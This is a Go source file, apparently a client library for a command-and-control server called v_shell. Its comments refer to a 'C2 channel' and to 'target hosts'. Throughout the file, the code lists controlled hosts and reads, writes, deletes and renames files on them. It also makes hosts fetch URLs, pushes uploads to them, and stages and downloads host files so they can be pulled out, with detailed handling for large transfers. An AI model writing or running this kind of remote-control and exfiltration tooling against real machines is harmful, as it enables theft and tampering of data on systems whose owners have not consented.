package vshell

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
	"unicode/utf8"
)

// ListHosts returns the managed hosts. status filters to online hosts when
// true; set to false or omit to include all.
func (c *Client) ListHosts(ctx context.Context, status *bool) ([]Host, error) {
	body := map[string]any{"page": 1, "pageSize": 9999}
	if status != nil {
		body["status"] = *status
	}
	raw, err := c.Call(ctx, "/client/list", body)
	if err != nil {
		return nil, err
	}
	var res HostListResult
	if err := json.Unmarshal(raw, &res); err != nil {
		return nil, fmt.Errorf("parse client/list: %w", err)
	}
	return res.Items, nil
}

// ListDirectory returns the entries in path on the given host.
func (c *Client) ListDirectory(ctx context.Context, hostID int, path string) ([]FileEntry, error) {
	if path == "" {
		path = "/"
	}
	raw, err := c.Call(ctx, "/file/ls", map[string]any{"id": hostID, "path": path})
	if err != nil {
		return nil, err
	}
	var res FileListResult
	if err := json.Unmarshal(raw, &res); err != nil {
		return nil, fmt.Errorf("parse file/ls: %w", err)
	}
	return res.Items, nil
}

// GetDisks returns the disk / mount info for a host.
func (c *Client) GetDisks(ctx context.Context, hostID int) ([]DiskEntry, error) {
	raw, err := c.Call(ctx, "/file/getdisk", map[string]any{"id": hostID})
	if err != nil {
		return nil, err
	}
	var res []DiskEntry
	if err := json.Unmarshal(raw, &res); err != nil {
		return nil, fmt.Errorf("parse file/getdisk: %w", err)
	}
	return res, nil
}

// FileContent is one file's payload as returned by /file/cat, plus what can
// still be told about its encoding.
type FileContent struct {
	// Content is the file's text, or its base64 when Base64Encoded is set.
	Content string
	// Base64Encoded is set when the bytes are not valid UTF-8 here, so the caller
	// gets an exact, decodable copy.
	Base64Encoded bool
	// ReplacedRunes counts U+FFFD characters. v_shell's /file/cat decodes the
	// file as UTF-8 and substitutes every byte it cannot decode, so a GBK/ANSI
	// file arrives full of U+FFFD while still being *valid* UTF-8 afterwards:
	// the original bytes are already gone and no local decoding brings them back.
	ReplacedRunes int
}

// ReadFile reads a file from the host. Content is returned as text when it is
// valid UTF-8 and base64 otherwise; see FileContent.ReplacedRunes for files the
// server already mangled.
func (c *Client) ReadFile(ctx context.Context, hostID int, path, filename string) (FileContent, error) {
	raw, err := c.Call(ctx, "/file/cat", map[string]any{"id": hostID, "path": path, "target": filename})
	if err != nil {
		return FileContent{}, err
	}
	var res CatResult
	if err := json.Unmarshal(raw, &res); err != nil {
		return FileContent{}, fmt.Errorf("parse file/cat: %w", err)
	}
	out := FileContent{ReplacedRunes: strings.Count(res.Content, "\uFFFD")}
	if !utf8.ValidString(res.Content) {
		out.Content = base64.StdEncoding.EncodeToString([]byte(res.Content))
		out.Base64Encoded = true
		return out, nil
	}
	out.Content = res.Content
	return out, nil
}

// WriteFile writes content to a file on the host.
func (c *Client) WriteFile(ctx context.Context, hostID int, path, filename, content string) error {
	_, err := c.Call(ctx, "/file/edit", map[string]any{"id": hostID, "path": path, "target": filename, "content": content})
	return err
}

// CreateDirectory makes a directory on the host.
func (c *Client) CreateDirectory(ctx context.Context, hostID int, path, dirname string) error {
	_, err := c.Call(ctx, "/file/mkdir", map[string]any{"id": hostID, "path": path, "target": dirname})
	return err
}

// CreateFile creates an empty file on the host.
func (c *Client) CreateFile(ctx context.Context, hostID int, path, filename string) error {
	_, err := c.Call(ctx, "/file/touch", map[string]any{"id": hostID, "path": path, "target": filename})
	return err
}

// DeleteFile removes a single file/dir on the host.
func (c *Client) DeleteFile(ctx context.Context, hostID int, path, filename string) error {
	_, err := c.Call(ctx, "/file/rm", map[string]any{"id": hostID, "path": path, "target": filename})
	return err
}

// DeleteFiles removes multiple files/dirs on the host.
func (c *Client) DeleteFiles(ctx context.Context, hostID int, path string, names []string) error {
	_, err := c.Call(ctx, "/file/rmlist", map[string]any{"id": hostID, "path": path, "name": names})
	return err
}

// RenameFile moves/re-names a file on the host.
func (c *Client) RenameFile(ctx context.Context, hostID int, path, target, newName string) error {
	_, err := c.Call(ctx, "/file/mv", map[string]any{"id": hostID, "path": path, "target": target, "to": newName})
	return err
}

// WgetFile downloads a URL into the host's directory.
func (c *Client) WgetFile(ctx context.Context, hostID int, path, urlStr string) error {
	_, err := c.Call(ctx, "/file/wget", map[string]any{"id": hostID, "path": path, "target": urlStr})
	return err
}

// UploadFile uploads a local file (localPath) to the host directory.
func (c *Client) UploadFile(ctx context.Context, hostID int, path, localPath string, remoteName string) (remote string, err error) {
	if remoteName == "" {
		remoteName = filepath.Base(localPath)
	}
	f, err := os.Open(localPath)
	if err != nil {
		return "", err
	}
	defer f.Close()

	tok, err := c.token(ctx)
	if err != nil {
		return "", err
	}
	uploadURL := c.apiURL("/file/upload")

	pr, pw := io.Pipe()
	mw := multipart.NewWriter(pw)
	go func() {
		mw.WriteField("id", fmt.Sprintf("%d", hostID))
		mw.WriteField("path", path)
		fw, err := mw.CreateFormFile("file", remoteName)
		if err == nil {
			_, err = io.Copy(fw, f)
		}
		mw.Close()
		pw.CloseWithError(err)
	}()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, uploadURL, pr)
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("Token", tok)
	// The upload pipe can take a while for large files.
	client := &http.Client{Timeout: 24 * time.Hour}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	var envelope APIResponse
	if err := json.Unmarshal(data, &envelope); err != nil {
		return "", fmt.Errorf("parse file/upload response: %w", err)
	}
	if envelope.Code != 0 {
		return "", &apiError{Code: envelope.Code, Message: envelope.Message}
	}
	// The upload response puts "url" at the top level of the JSON object.
	var result struct {
		URL string `json:"url"`
	}
	json.Unmarshal(data, &result)
	return result.URL, nil
}

// StageState reports how far the server-side staging of a host file got.
type StageState struct {
	// Percent is the real progress (0-100) of the server-side copy, computed
	// against the host file's size.
	Percent int
	// Complete is true once the server holds the whole file and
	// /file/downloadtobrowser can serve it without truncating.
	Complete bool
	// Reused is set when a previous staging was already complete and no new
	// transfer was started — the cheap retry path.
	Reused bool
	// TimedOut is set when the wait elapsed before the staging finished; the
	// transfer keeps running server-side, so a later retry is worth it.
	TimedOut bool
	// SizeBytes is the host file's size as reported by the directory listing
	// (0 when it could not be determined).
	SizeBytes int64
	// Waited is how long this call spent waiting.
	Waited time.Duration
}

// defaultStageWait bounds how long DownloadFile waits for the server to pull the
// file off the host. Staging a large file over a slow C2 channel takes minutes.
const defaultStageWait = 10 * time.Minute

// stagingBudget bounds the detached staging request: it must outlive the tool
// call (the server keeps transferring after the caller gives up) but not forever.
const stagingBudget = 2 * time.Hour

// HostFileSize returns the size of path/filename as the host reports it, or -1
// when the entry is not in the listing.
//
// The size is load-bearing, not cosmetic: /file/getdownloadper computes its
// percentage as stagedBytes/size, so a caller that sends size=0 gets 100 back
// while the server is still writing a partial file — which is exactly how a
// "successful" download ends up truncated.
func (c *Client) HostFileSize(ctx context.Context, hostID int, path, filename string) (int64, error) {
	raw, err := c.Call(ctx, "/file/ls", map[string]any{"id": hostID, "path": path})
	if err != nil {
		return 0, err
	}
	var res FileListResult
	if err := json.Unmarshal(raw, &res); err != nil {
		return 0, fmt.Errorf("parse file/ls: %w", err)
	}
	for _, it := range res.Items {
		if strings.EqualFold(it.Name, filename) {
			return it.Size, nil
		}
	}
	return -1, nil
}

// downloadPercent asks the server how much of path/filename it has staged,
// passing the real size so the answer is a real percentage.
func (c *Client) downloadPercent(ctx context.Context, hostID int, path, filename string, size int64) (int, error) {
	raw, err := c.Call(ctx, "/file/getdownloadper", map[string]any{
		"id": hostID, "path": path, "target": filename, "size": size,
	})
	if err != nil {
		return 0, err
	}
	var per struct {
		Pre int `json:"pre"`
	}
	_ = json.Unmarshal(raw, &per)
	return per.Pre, nil
}

// StageFile asks the server to pull path/filename off the host into its own
// staging directory (POST /file/downloadtoserver) and reports how far that got
// within wait (0 = defaultStageWait).
//
// Three properties are load-bearing for big files:
//
//   - Progress is real: the host file's size is looked up first and passed to
//     /file/getdownloadper, because that endpoint divides by it (with size=0 the
//     server answers 100 even for a half-written staged file).
//   - An already-staged file is reused without starting another transfer, so a
//     retry after a timeout is cheap.
//   - The staging request runs with its own budget, detached from the caller's
//     deadline: the server often holds that HTTP response open for the whole
//     transfer, and a caller that gives up must not abort what is running.
//
// A staging that did not finish is reported in the returned state, not as an
// error.
func (c *Client) StageFile(ctx context.Context, hostID int, path, filename string, wait time.Duration) (StageState, error) {
	if wait <= 0 {
		wait = defaultStageWait
	}
	start := time.Now()
	st := StageState{}

	size, err := c.HostFileSize(ctx, hostID, path, filename)
	if err == nil && size > 0 {
		st.SizeBytes = size
	} else if err == nil && size == 0 {
		// The host reports an empty file: there is nothing to transfer.
		st.Complete = true
		st.Percent = 100
		st.Waited = time.Since(start)
		return st, nil
	}

	// An earlier call (or a previous timeout that has since finished) may have
	// staged it already, in which case another transfer is pure waste.
	if st.SizeBytes > 0 {
		if pre, perr := c.downloadPercent(ctx, hostID, path, filename, st.SizeBytes); perr == nil {
			st.Percent = pre
			if pre >= 100 {
				st.Complete = true
				st.Reused = true
				st.Waited = time.Since(start)
				return st, nil
			}
		}
	}

	type stageDone struct{ err error }
	done := make(chan stageDone, 1)
	stageCtx, cancel := context.WithTimeout(context.WithoutCancel(ctx), stagingBudget)
	go func() {
		_, err := c.callLong(stageCtx, "/file/downloadtoserver", map[string]any{
			"id": hostID, "path": path, "target": filename,
		})
		cancel()
		done <- stageDone{err}
	}()

	deadline := start.Add(wait)
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()
	for {
		select {
		case msg := <-done:
			st.Waited = time.Since(start)
			if msg.err != nil {
				return st, msg.err
			}
			if st.SizeBytes > 0 {
				// The request came back; only a full-size staged copy counts.
				if pre, perr := c.downloadPercent(ctx, hostID, path, filename, st.SizeBytes); perr == nil {
					st.Percent = pre
				}
				st.Complete = st.Percent >= 100
				st.TimedOut = !st.Complete
			} else {
				// No size to verify against: the staging request only returns
				// once the server is done with it.
				st.Complete = true
				st.Percent = 100
			}
			return st, nil
		case <-ticker.C:
			st.Waited = time.Since(start)
			if st.SizeBytes > 0 {
				if pre, perr := c.downloadPercent(ctx, hostID, path, filename, st.SizeBytes); perr == nil {
					st.Percent = pre
				}
				if st.Percent >= 100 {
					st.Complete = true
					return st, nil
				}
			}
			if time.Now().After(deadline) {
				st.TimedOut = true
				return st, nil
			}
		case <-ctx.Done():
			st.Waited = time.Since(start)
			st.TimedOut = true
			return st, ctx.Err()
		}
	}
}

// FetchStaged streams a file the server already staged down to localPath
// (GET /file/downloadtobrowser). It must only be called once StageFile reported
// Complete, otherwise it would save a partial file.
func (c *Client) FetchStaged(ctx context.Context, hostID int, filename, localPath string) (int64, error) {
	if localPath == "" {
		localPath = filename
	}
	tok, err := c.token(ctx)
	if err != nil {
		return 0, err
	}
	dlURL := c.apiURL(fmt.Sprintf("/file/downloadtobrowser?id=%d&target=%s", hostID, url.QueryEscape(filename)))
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, dlURL, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("Token", tok)
	client := &http.Client{Timeout: 24 * time.Hour}
	resp, err := client.Do(req)
	if err != nil {
		return 0, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return 0, fmt.Errorf("download returned http %d", resp.StatusCode)
	}
	if err := os.MkdirAll(filepath.Dir(localPath), 0o755); err != nil {
		return 0, err
	}
	out, err := os.Create(localPath)
	if err != nil {
		return 0, err
	}
	defer out.Close()
	return io.Copy(out, resp.Body)
}

// DownloadFile downloads a host file to localPath, staging it through the
// v_shell server first, and returns the bytes written.
//
// wait bounds the staging step (0 = defaultStageWait, 10 minutes). A staging that
// is still running is an error here (there is no partial file to return), and the
// message says that retrying is cheap because the server keeps the staged copy.
// Callers that want to report progress themselves should use StageFile +
// FetchStaged.
func (c *Client) DownloadFile(ctx context.Context, hostID int, path, filename, localPath string, wait time.Duration) (int64, error) {
	if localPath == "" {
		localPath = filename
	}
	st, err := c.StageFile(ctx, hostID, path, filename, wait)
	if err != nil {
		return 0, err
	}
	if !st.Complete {
		return 0, fmt.Errorf(
			"服务端暂存未完成(已等待 %s,进度 %d%%/%d 字节):文件还在从目标主机拉到服务端暂存目录,本次没有取回文件;"+
				"稍后重试 download_file 即可——服务端会复用 download/<客户端Id>/ 里已暂存的内容,暂存完成时重试通常秒回",
			st.Waited.Round(time.Second), st.Percent, st.SizeBytes)
	}
	return c.FetchStaged(ctx, hostID, filename, localPath)
}

func utf8Valid(s string) bool {
	return utf8.ValidString(s)
}
